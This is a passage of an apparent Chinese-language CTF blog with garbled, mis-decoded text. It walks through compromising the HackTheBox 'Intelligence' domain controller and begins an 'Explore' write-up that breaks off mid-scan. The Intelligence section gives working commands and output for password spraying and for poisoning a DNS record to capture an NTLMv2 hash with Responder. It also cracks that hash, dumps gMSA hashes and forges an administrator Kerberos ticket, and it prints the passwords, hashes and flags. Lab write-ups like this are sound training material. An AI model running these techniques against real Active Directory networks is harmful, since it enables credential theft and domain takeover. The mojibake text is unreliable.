·æˆ‘ä»¬å°±æœ‰äº†ä¸€ä¸ªè´¦æˆ·å¯†ç  username = Jason.Patterson password = NewIntelligenceCorpUser9876 å’±ä»¬ç›´æ¥ä½¿ç”¨smbè¿›è¡Œç™»å½• smbclient -L //10.10.10.248 -U Tiffany.Molina ä½†å½“æˆ‘å°è¯•ç™»å½•çš„æ—¶å€™ï¼Œå´æç¤ºæˆ‘å¤±è´¥äº†ã€‚ä¼°è®¡æ˜¯è´¦æˆ·å¯†ç ä¸åŒ¹é…ï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½çˆ†ç ´ä¸€æ³¢äº† ä½¿ç”¨crackmapexecè¿›è¡Œçˆ†ç ´ crackmapexec smb 10.10.10.248 -u users -p â€œNewIntelligenceCorpUser9876â€ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876 [*] Initializing LDAP protocol database [*] Generating SSL certificate SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) SMB 10.10.10.248 445 DC [-] intelligence.htb\\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [+] intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876 æˆåŠŸè·å¾—æ­£ç¡®çš„smbè´¦å·å’Œå¯†ç  username = Tiffany.Molina password = NewIntelligenceCorpUser9876 ç™»å½•smbè¿›è¡ŒæŸ¥çœ‹ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# smbclient -L //10.10.10.248 -U Tiffany.Molina Enter WORKGROUP\\Tiffany.Molina&#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC IT Disk NETLOGON Disk Logon server share SYSVOL Disk Logon server share Users Disk SMB1 disabled -- no workgroup available ç™»å½•æˆåŠŸï¼Œå’±ä»¬æŸ¥æ‰¾ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯åˆ©ç”¨çš„æ–‡ä»¶å§ å¯ä»¥æŸ¥çœ‹çš„å°±ITå’ŒUsersç›®å½•ï¼Œå’±ä»¬åˆ†åˆ«å»æŸ¥çœ‹ä¸€ä¸‹ smbclient //10.10.10.248/IT -U Tiffany.Molina smbclient //10.10.10.248/Users -U Tiffany.Molina åœ¨ITç›®å½•ä¸‹æ‰¾åˆ°äº†ä¸€ä¸ªps1çš„æ–‡ä»¶ â”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# smbclient //10.10.10.248/IT -U Tiffany.Molina 130 â¨¯ Enter WORKGROUP\\Tiffany.Molina&#39;s password: Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; ls . D 0 Mon Apr 19 08:50:55 2021 .. D 0 Mon Apr 19 08:50:55 2021 downdetector.ps1 A 1046 Mon Apr 19 08:50:55 2021 3770367 blocks of size 4096. 1330536 blocks available smb: \\&gt; get downdetector.ps1 getting file \\downdetector.ps1 of size 1046 as downdetector.ps1 (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec) å…ˆä¸‹è½½ä¸‹æ¥ï¼Œå’±ä»¬å»çœ‹çœ‹usersç›®å½• åœ¨Users\\Tiffany.Molina\\Desktopä¸‹æ‰¾åˆ°äº†user.txtæ–‡ä»¶ smb: \\Tiffany.Molina\\Desktop\\&gt; get user.txt getting file \\Tiffany.Molina\\Desktop\\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# cat user.txt 1 âš™ 6d148717e36be40a48439bdf34ea3054 æˆåŠŸè·å¾—useræƒé™çš„flagæ–‡ä»¶ æ¼æ´åˆ©ç”¨æŸ¥çœ‹ä¸€ä¸‹downdetector.ps1æ–‡ä»¶çš„å†…å®¹ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# cat downdetector.ps1 1 âš™ ï¿½ï¿½# Check web server status. Scheduled to run every 5min Import-Module ActiveDirectory foreach($record in Get-ChildItem &quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot; | Where-Object Name -like &quot;web*&quot;) { try { $request = Invoke-WebRequest -Uri &quot;http://$($record.Name)&quot; -UseDefaultCredentials if(.StatusCode -ne 200) { Send-MailMessage -From &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -To &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -Subject &quot;Host: $($record.Name) is down&quot; } } catch {} } æˆ‘ä»¬è§£è¯»ä¸€ä¸‹è¯¥æ–‡ä»¶çš„å†…å®¹ï¼Œæ¯äº”åˆ†é’Ÿï¼Œå®ƒä¼šæ£€æŸ¥ä»¥â€œwebâ€å¼€å¤´çš„åŸŸintelligence.htbçš„ä»»ä½•DNSè®°å½•ï¼Œå¹¶ä½¿ç”¨Tedçš„å‡­æ®ä¸ºæ¯ä¸ªæ‰¾åˆ°çš„åŸŸå‘é€HTTPè¯·æ±‚ã€‚(ä½¿ç”¨-UseDefaultCredentialsé€‰é¡¹)å¦‚æœæœåŠ¡å™¨æ²¡æœ‰è¿”å›200 OKçŠ¶æ€ç ï¼Œåˆ™ä¼šå‘Tedå‘é€ä¸€å°é‚®ä»¶ã€‚ æˆ‘ä»¬è¦åšçš„æ˜¯ä½¿ç”¨dnstool.pyæ·»åŠ ä¸€ä¸ªä»webå¼€å§‹ä¸å­˜åœ¨çš„å‡VHOSTåˆ°zoneã€‚è¿™æ ·å°±ä¼šè§¦å‘è„šæœ¬å‘Tedå‘é€é‚®ä»¶ã€‚ &gt; https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py python3 dnstool.py -u &#39;intelligence.htb\\Tiffany.Molina&#39; -p &#39;NewIntelligenceCorpUser9876&#39; -a add -r &#39;weboops.intelligence.htb&#39; -d 10.10.14.40 10.10.10.248 10.10.14.40 æ˜¯æˆ‘ä»¬æœ¬åœ°çš„IP 10.10.10.248 æ˜¯é¶æœºçš„IP è¯¥è„šæœ¬ä¼šå‘æˆ‘ä»¬å‘é€ç”µå­é‚®ä»¶ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨responderæ¥è¿›è¡Œå—…æ¢å¹¶æ•è·Tedç”¨æˆ·çš„å¯†ç Hashå€¼ responder -I tun0 -A æ‰§è¡Œåï¼Œç”±äºè¯¥è„šæœ¬æ¯äº”åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡ï¼Œæ‰€ä»¥å’±ä»¬éœ€è¦ç­‰ç­‰ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# responder -I tun0 -A __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR &amp; MDNS Responder 3.0.2.0 Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] DNS/MDNS [ON] [+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [OFF] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] RDP server [ON] [+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF] [+] Poisoning Options: Analyze Mode [ON] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [OFF] Fingerprint hosts [OFF] [+] Generic Options: Responder NIC [tun0] Responder IP [10.10.14.40] Challenge set [random] Don&#39;t Respond To Names [&#39;ISATAP&#39;] [i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned. [Analyze mode: ICMP] You can ICMP Redirect on this network. [Analyze mode: ICMP] This workstation (10.10.14.40) is not on the same subnet than the DNS server (192.168.72.2). [Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details. [+] Listening for events... [HTTP] NTLMv2 Client : 10.10.10.248 [HTTP] NTLMv2 Username : intelligence\\Ted.Graves [HTTP] NTLMv2 Hash : Ted.Graves::intelligence:0daa3ec1b284a949:CD76623716C3609875D86DDA36EB0EDF:0101000000000000A604499B3D73D7015C5EEEC5D556C5D8000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000000000000200000035C7091E068F4D7CCC464ABE730F3C960A0B592A633A716B97E3209EF5BD0D30A0010000000000000000000000000000000000009003A0048005400540050002F007700650062006F006F00700073002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 æˆåŠŸæ•è·hashï¼Œå’±ä»¬ä¿å­˜åˆ°æœ¬åœ° å’±ä»¬è¿™é‡Œä½¿ç”¨johnè¿›è¡Œhashçˆ†ç ´ï¼Œå¤§å®¶ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–å·¥å…·ï¼Œæ¯”å¦‚hashcat john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt çˆ†ç ´å®Œä»¥åæŸ¥çœ‹hash.txt johb --show hash.txt æˆåŠŸè·å¾—è´¦å·å¯†ç  username = Ted.Graves password = Mr.Teddy æˆ‘ä»¬æˆåŠŸæ‹¿åˆ°äº†Tedçš„è´¦æˆ·å¯†ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•å°†ç”¨æˆ·å…±äº«æŒ‚è½½ä¸ºTedå¹¶æšä¸¾ mkdir mount ;sudo mount //10.10.10.248/Users mount/ -o username=â€Ted.Gravesâ€,password=â€Mr.Teddyâ€ å¯æƒœçš„æ˜¯ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œè‹¦äºæ²¡æœ‰æ€è·¯ï¼Œæˆ‘åˆå»æ£€æŸ¥äº†ä¸€éä¹‹å‰æ‰¾åˆ°çš„æ–‡ä»¶ï¼Œåœ¨2020-12-30-upload.pdfä¸­ï¼Œè¿˜çœŸå‘ç°äº†ç‚¹ä¸œè¥¿ Internal IT Update There has recently been some outages on our web servers. Ted has gotten ascript in place to help notify us if this happens again.Also, after discussion following our recent security audit we are in the processof locking down our service accounts. å¤§è‡´æ„æ€å°±æ˜¯è¯´ä»–ä»¬è¿˜æ²¡æœ‰é”å®šæœåŠ¡è´¦æˆ·ã€‚é€šè¿‡GoogleæŸ¥æ‰¾åå‘ç°ï¼Œå¦‚æœå¯ç”¨äº†æœåŠ¡è´¦æˆ·ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä½¿ç”¨gMASDumper.pyè½¬å‚¨Hashå€¼ã€‚ æƒé™æå‡ https://github.com/micahvandeusen/gMSADumper å’±ä»¬ä½¿ç”¨è¿™ä¸ªè„šæœ¬ä¸ºTedè·å–ä¸€ä¸ªNTHash python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/gMSADumper] â””â”€# python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2 æœ‰äº†è¿™ä¸ªä¹‹åï¼Œå’±ä»¬å¯ä»¥åšPTTï¼ˆPass The Ticketï¼‰æ”»å‡»ã€‚ å’±ä»¬ä½¿ç”¨ntpdateè¿›è¡Œåˆ©ç”¨ ntpdate 10.10.10.248 å¦‚æœè¿è¡Œåæ—¶é—´æ²¡æœ‰æ›´æ”¹ï¼Œä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è§£å†³ apt-get install chrony timedatectl set-ntp true ntpdate 10.10.10.248 ä½¿ç”¨pythonè‡ªå¸¦çš„getST.pyä»¥ç®¡ç†å‘˜èº«ä»½è·å–ç¥¨æ®ï¼Œä»¥ä¾¿äºæˆ‘ä»¬ä»¥ç”¨æˆ·èº«ä»½è¿è¡Œå‘½ä»¤ python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/gMSADumper] â””â”€# python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator 127 â¨¯ Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation [*] Getting TGT for user [*] Impersonating administrator [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in administrator.ccache ç¥¨æ®å·²ä¿å­˜ä¸ºadministrator.ccacheï¼Œæœ‰äº†è¿™ä¸ªç¥¨æ®ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å„ç§å·¥å…·è¿›è¡Œåˆ©ç”¨äº† ä½¿ç”¨exportæ¥å°†ç¥¨æ®ä½œä¸ºç¯å¢ƒå˜é‡ export KRB5CCNAME=administrator.ccache è¿™é‡Œæˆ‘ä»¬ç»§ç»­ä½¿ç”¨pythonçš„å·¥å…·smbclient.pyè¿›è¡Œåˆ©ç”¨ python3 /usr/share/doc/python3-impacket/examples/smbclient.py -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass è¿›å…¥åï¼Œæˆ‘ä»¬å°±æˆåŠŸä½¿ç”¨smbclient.pyç™»å½•åˆ°smbé‡Œäº† è¿›å…¥åï¼Œå’±ä»¬è·å–rootæƒé™çš„flagæ–‡ä»¶å³å¯ shares use Users ls cd Administrator cd Desktop get root.txt â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# cat root.txt 69f9f1591b2d1701721d539a138c3ce9 æˆåŠŸè·å¾—rootæƒé™çš„flagæ–‡ä»¶ æ”¶å·¥ç¡è§‰","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Explore - Hackthebox","slug":"Hackthebox - Explore","date":"2021-07-06T11:38:36.000Z","updated":"2023-05-20T01:44:31.000Z","comments":true,"path":"2021/07/06/Hackthebox - Explore/","link":"","permalink":"http://www.lucifiel.com/2021/07/06/Hackthebox%20-%20Explore/","excerpt":"","text":"Hackthebox - Exploreé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›† nmap -A -sS -sC -sV -p- 10.10.10.247 â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nmap -A -sS -sC -sV -p- 10.10.10.247 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 17:01 CST Nmap scan report for explore.htb (10.10.10.247) Host is up (0.25s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 5555/tcp filtered freeciv 38237/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request | Date: Tue, 06 Jul 2021 09:28:06 GMT | Content-Length: 22 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | GetRequest: | HTTP/1.1 412 Precondition Failed | Date: Tue, 06 Jul 2021 09:28:06 GMT | Content-Length: 0 | HTTPOptions: | HTTP/1.0 501 Not Implemented | Date: Tue, 06 Jul 2021 09:28:11 GMT | Content-Length: 29 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Method not supported: OPTIONS | Help: | HTTP/1.0 400 Bad Request | Date: Tue, 06 Jul 2021 09:28:28 GMT | Content-Length: 26 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: HELP | RTSPRequest: | HTTP/1.0 400 Bad Request | Date: Tue, 06 Jul 2021 09:28:11 GMT | Content-Length: 39 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | valid protocol version: RTSP/1.0 | SSLSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 06 Jul 2021 09:28:28 GMT | Content-Length: 73 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ?G???,???`~? | ??{????w????&lt;=?o? | TLSSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 06 Jul 2021 09:28:29 GMT | Content-Length: 71 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ??random1random2random3random4 | TerminalServerCookie: | HTTP/1.0 400 Bad Request | Date: Tue, 06 Jul 2021 09:28:29 GMT | Content-Length: 54 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: |_ Cookie: mstshash=nmap 42135/tcp open http ES File Explorer Name Response httpd |_http-server-header: ES Name Response Server |_http-title: Site doesn&#39;t have a title (text/html). 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn&#39;t have a title (text/plain). 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port2222-TCP:V=7.91%I=7%D=7/6%Time=60E41F41%P=x86_64-pc-linux-gnu%r(NUL SF:L,24,&quot;SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n&quot;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port38237-TCP:V=7.91%I=7%D=7/6%Time=60E41F41%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,AA,&quot;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x200 SF:6\\x20Jul\\x202021\\x2009:28:06\\x20GMT\\r\\nContent-Length:\\x2022\\r\\nContent SF:-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r SF:\\nInvalid\\x20request\\x20line:\\x20&quot;)%r(GetRequest,5C,&quot;HTTP/1\\.1\\x20412\\x SF:20Precondition\\x20Failed\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28 SF::06\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(HTTPOptions,B5,&quot;HTTP/1\\. SF:0\\x20501\\x20Not\\x20Implemented\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2 SF:009:28:11\\x20GMT\\r\\nContent-Length:\\x2029\\r\\nContent-Type:\\x20text/plai SF:n;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nMethod\\x20not\\x20 SF:supported:\\x20OPTIONS&quot;)%r(RTSPRequest,BB,&quot;HTTP/1\\.0\\x20400\\x20Bad\\x20Re SF:quest\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28:11\\x20GMT\\r\\nConte SF:nt-Length:\\x2039\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\ SF:nConnection:\\x20Close\\r\\n\\r\\nNot\\x20a\\x20valid\\x20protocol\\x20version:\\ SF:x20\\x20RTSP/1\\.0&quot;)%r(Help,AE,&quot;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDat SF:e:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28:28\\x20GMT\\r\\nContent-Length:\\x SF:2026\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection: SF:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20HELP&quot;)%r(SSLSessionReq, SF:DD,&quot;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x2 SF:02021\\x2009:28:28\\x20GMT\\r\\nContent-Length:\\x2073\\r\\nContent-Type:\\x20t SF:ext/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInvalid\\x SF:20request\\x20line:\\x20\\x16\\x03\\0\\0S\\x01\\0\\0O\\x03\\0\\?G\\?\\?\\?,\\?\\?\\?`~\\?\\ SF:0\\?\\?{\\?\\?\\?\\?w\\?\\?\\?\\?&lt;=\\?o\\?\\x10n\\0\\0\\(\\0\\x16\\0\\x13\\0&quot;)%r(TerminalSer SF:verCookie,CA,&quot;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2006 SF:\\x20Jul\\x202021\\x2009:28:29\\x20GMT\\r\\nContent-Length:\\x2054\\r\\nContent- SF:Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\ SF:nInvalid\\x20request\\x20line:\\x20\\x03\\0\\0\\*%\\?\\0\\0\\0\\0\\0Cookie:\\x20mstsh SF:ash=nmap&quot;)%r(TLSSessionReq,DB,&quot;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDa SF:te:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28:29\\x20GMT\\r\\nContent-Length:\\ SF:x2071\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection SF::\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20\\x16\\x03\\0\\0i\\x01\\0\\0e SF:\\x03\\x03U\\x1c\\?\\?random1random2random3random4\\0\\0\\x0c\\0/\\0&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=7/6%OT=2222%CT=1%CU=35534%PV=Y%DS=2%DC=T%G=Y%TM=60E41F OS:BE%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SE OS:Q(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW6%O2=M54DST11NW6% OS:O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST11NW6%O6=M54DST11)WIN(W1=FFFF%W2 OS:=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=Y%T=40%W=FFFF%O=M54DNNS OS:NW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y% OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR% OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40% OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G% OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: Device: phone TRACEROUTE (using port 5900/tcp) HOP RTT ADDRESS 1 253.69 ms 10.10.14.1 2 253.76 ms explore.htb (10.10.10.247) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 979.56 seconds å’±ä»¬å‘ç°ï¼Œåˆ†åˆ«åœ¨38237ã€42135å’Œ59777ä¸Šè¿è¡Œäº†HTTPæœåŠ¡ å’±ä»¬åˆ†åˆ«å»çœ‹çœ‹ è¿™è¾¹æç¤ºæ˜¯ç©ºå“åº”ï¼Ÿé‚£åšä¸ªfuzzçœ‹çœ‹ ffuf -u http://10.10.10.247:59777/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 100 -e .php,.html â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# ffuf -u http://10.10.10.247:59777/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 100 -e .php,.html /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.247:59777/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Extensions : .php .html :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 100 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ 